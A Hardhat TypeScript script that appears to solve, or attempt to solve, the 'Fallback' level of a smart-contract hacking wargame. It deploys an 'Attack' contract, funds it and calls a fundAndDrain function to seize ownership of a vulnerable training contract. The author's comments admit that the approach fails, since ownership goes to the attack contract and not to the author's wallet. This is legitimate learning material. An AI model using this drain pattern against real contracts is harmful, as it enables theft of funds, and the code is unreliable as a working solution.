import { ethers } from "hardhat";

async function main() {


    const Fallback = await ethers.getContractFactory("Fallback");
    const fallback = Fallback.attach("0x18DEcB689fabB67F2A583Be640AF0c6f6bEB0F51");

    const Attacker = await ethers.getContractFactory("Attack");
    const attacker = await Attacker.deploy();

    const [account] = await ethers.getSigners();

    let tx = await account.sendTransaction({
        to: attacker.address,
        value: ethers.utils.parseEther("0.0002"),
        gasLimit: 22000
    });
    await tx.wait();

    let tx2 = await attacker.fundAndDrain();
    await tx2.wait();

    console.log(`Attacker Address: ${attacker.address}`);
    console.log(`Fallback Owner: ${await fallback.owner()}`);

    // I made this much more complicated than it had to be, but I wanted to learn better
    // interact with contracts using hardhat/typescript.All I would have to do to solve this problem
    // is call Fallback's contribute function from my account, then send some eth to Fallback and badda bing
    // I would be the owner of the contract

    // Actually this doesn't even solve it because the owner needs to be my wallet
    // lmao
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });